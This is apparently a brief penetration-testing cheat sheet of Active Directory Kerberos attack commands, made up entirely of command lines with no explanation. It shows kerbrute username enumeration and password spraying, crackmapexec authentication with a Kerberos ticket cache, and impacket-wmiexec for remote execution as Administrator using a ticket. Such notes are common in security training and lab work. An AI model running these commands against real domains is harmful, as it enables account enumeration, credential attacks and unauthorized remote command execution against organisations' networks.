# kerbrute
https://github.com/ropnop/kerbrute

## enumerate users using wordlist
```bash
kerbrute userenum --dc $IP -d DOMAIN.local $FILE
kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -dc-ip 10.11.1.20 -domain svcorp.com
```

## password spray users from user list file
```bash
kerbrute passwordspray --dc $IP -d DOMAIN.local users password123
```

# crackmapexec kerberos authentication with ticket
## include ticket environment variable
the hostname is very important.
```bash
export KRB5CCNAME=$(pwd)/User.ccache
crackmapexec smb fqdn.domain.local -u User --kerberos
```

# impacket kerberos commands
## wmiexec
```bash
export KRB5CCNAME=$(pwd)/Administrator.ccache
impacket-wmiexec -k -no-pass domain.local/Administrator@fqdn.domain.local
```
